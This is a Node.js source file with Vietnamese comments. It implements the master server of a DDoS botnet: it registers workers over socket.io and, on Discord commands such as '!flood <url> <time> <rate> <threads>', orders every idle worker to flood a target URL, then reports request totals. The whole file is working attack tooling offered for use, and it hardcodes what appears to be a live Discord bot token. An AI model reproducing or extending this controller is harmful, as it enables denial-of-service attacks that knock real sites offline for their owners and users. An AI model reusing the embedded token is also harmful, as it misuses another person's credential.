// master.js - Chạy trên VPS chính
// node master.js

const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const { Client, GatewayIntentBits } = require('discord.js');

// ==================== DISCORD BOT ====================
const TOKEN = 'MTQ1Njk2NDc5NDIxMjE1OTcwMg.Gbjcnz.OTQf4MPxvnLklLbUPfeaDSvTCeJMuBxh70tfZM';
const CHANNEL_ID = '1456595444477198508';

const discordClient = new Client({ 
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] 
});

// ==================== BIẾN TOÀN CỤC ====================
let workers = {}; // { workerId: { socket, status, target, rate, threads } }
let currentAttack = null;
let totalReqs = 0;

// ==================== SERVER NHẬN KẾT NỐI TỪ WORKER ====================
app.use(express.static('public'));
app.get('/workers', (req, res) => {
    res.json(Object.keys(workers).map(id => ({
        id,
        status: workers[id].status,
        target: workers[id].target,
        ip: workers[id].ip
    })));
});

io.on('connection', (socket) => {
    console.log(`[+] Worker connected: ${socket.id}`);
    
    // Worker gửi thông tin
    socket.on('register', (data) => {
        workers[socket.id] = {
            socket: socket,
            ip: data.ip,
            status: 'idle',
            target: null,
            rate: 0,
            threads: 0,
            lastSeen: Date.now()
        };
        console.log(`[+] Worker registered: ${data.ip}`);
        
        // Nếu đang có attack, tự động gửi lệnh cho worker mới
        if (currentAttack) {
            socket.emit('attack', currentAttack);
            workers[socket.id].status = 'attacking';
            workers[socket.id].target = currentAttack.target;
        }
    });
    
    // Worker gửi stats
    socket.on('stats', (data) => {
        if (workers[socket.id]) {
            workers[socket.id].lastSeen = Date.now();
            if (data.count) totalReqs += data.count;
        }
    });
    
    // Worker ngắt kết nối
    socket.on('disconnect', () => {
        console.log(`[-] Worker disconnected: ${socket.id}`);
        delete workers[socket.id];
    });
});

// ==================== DISCORD BOT ====================
discordClient.once('ready', () => {
    console.log(`[+] Discord Bot ready!`);
    const channel = discordClient.channels.cache.get(CHANNEL_ID);
    if (channel) {
        channel.send(`
╔══════════════════════════════════════════════════════╗
║     BOTNET MASTER - READY                            ║
╠══════════════════════════════════════════════════════╣
║  !flood <url> <time> <rate> <threads>                ║
║  !stop                                                ║
║  !status                                              ║
║  !workers                                             ║
║  !help                                                ║
╚══════════════════════════════════════════════════════╝
        `);
    }
});

discordClient.on('messageCreate', (msg) => {
    if (msg.channel.id !== CHANNEL_ID || !msg.content.startsWith('!')) return;
    
    const args = msg.content.slice(1).split(' ');
    const cmd = args[0].toLowerCase();
    
    if (cmd === 'help') {
        msg.channel.send(`
**📚 LỆNH:**
\`!flood <url> <time> <rate> <threads>\` - Tấn công
\`!stop\` - Dừng tất cả
\`!status\` - Xem trạng thái
\`!workers\` - Xem danh sách worker
\`!help\` - Hướng dẫn
        `);
    }
    
    else if (cmd === 'workers') {
        const list = Object.values(workers).map(w => 
            `🔹 ${w.ip} - ${w.status} ${w.target ? '🎯 ' + w.target : ''}`
        ).join('\n');
        
        msg.channel.send(`**📡 WORKERS (${Object.keys(workers).length}):**\n${list || 'Không có worker nào'}`);
    }
    
    else if (cmd === 'flood') {
        if (args.length < 5) return msg.channel.send('❌ Thiếu tham số!');
        
        const target = args[1];
        const time = parseInt(args[2]);
        const rate = parseInt(args[3]);
        const threads = parseInt(args[4]);
        
        if (Object.keys(workers).length === 0) {
            return msg.channel.send('❌ Không có worker nào!');
        }
        
        currentAttack = { target, time, rate, threads, start: Date.now() };
        totalReqs = 0;
        
        // Gửi lệnh cho tất cả worker
        let sent = 0;
        Object.values(workers).forEach(w => {
            if (w.status === 'idle') {
                w.socket.emit('attack', { target, time, rate, threads });
                w.status = 'attacking';
                w.target = target;
                sent++;
            }
        });
        
        msg.channel.send(`
🔥 **BOTNET ATTACK STARTED**
Target: ${target}
Time: ${time}s
Rate: ${rate}/worker
Threads: ${threads}/worker
Workers: ${sent}/${Object.keys(workers).length}
        `);
        
        // Tự động dừng sau thời gian
        setTimeout(() => {
            if (currentAttack) {
                Object.values(workers).forEach(w => {
                    if (w.status === 'attacking') {
                        w.socket.emit('stop');
                        w.status = 'idle';
                        w.target = null;
                    }
                });
                currentAttack = null;
                
                const elapsed = Math.floor((Date.now() - currentAttack?.start) / 1000);
                msg.channel.send(`
✅ **BOTNET ATTACK FINISHED**
Thời gian: ${time}s
Tổng requests: ${totalReqs.toLocaleString()}
RPS trung bình: ${Math.floor(totalReqs / time)}
                `);
            }
        }, time * 1000);
    }
    
    else if (cmd === 'stop') {
        if (currentAttack) {
            Object.values(workers).forEach(w => {
                if (w.status === 'attacking') {
                    w.socket.emit('stop');
                    w.status = 'idle';
                    w.target = null;
                }
            });
            currentAttack = null;
            msg.channel.send('🛑 **BOTNET STOPPED**');
        } else {
            msg.channel.send('⚠️ Không có attack nào');
        }
    }
    
    else if (cmd === 'status') {
        const attacking = Object.values(workers).filter(w => w.status === 'attacking').length;
        const idle = Object.values(workers).filter(w => w.status === 'idle').length;
        
        msg.channel.send(`
📊 **BOTNET STATUS**
Workers: ${Object.keys(workers).length} total
🎯 Attacking: ${attacking}
💤 Idle: ${idle}
📈 Total requests: ${totalReqs.toLocaleString()}
        `);
    }
});

// ==================== CHẠY SERVER ====================
http.listen(3000, '0.0.0.0', () => {
    console.log('[+] Master server running on port 3000');
});

discordClient.login(TOKEN);